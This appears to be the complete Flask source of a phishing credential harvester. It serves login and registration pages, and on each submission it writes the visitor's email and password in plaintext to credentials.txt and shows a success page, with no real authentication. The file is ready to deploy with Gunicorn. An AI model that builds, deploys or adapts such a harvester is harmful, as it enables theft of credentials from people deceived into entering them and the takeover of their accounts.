from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return render_template("login.html")

    email = request.form["email"]
    password = request.form["password"]
    
    with open("credentials.txt", "a") as f:
        f.write(f"LOGIN - {email}:{password}\n")
    
    return render_template("success.html")

@app.route("/registro")
def registro():
    return render_template("register.html")

@app.route("/register", methods=["POST"])
def register():
    email = request.form["email"]
    password = request.form["password"]
    
    with open("credentials.txt", "a") as f:
        f.write(f"REGISTRO - {email}:{password}\n")
    
    return render_template("success.html")

# Este bloque permite que Gunicorn cargue la app correctamente
if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
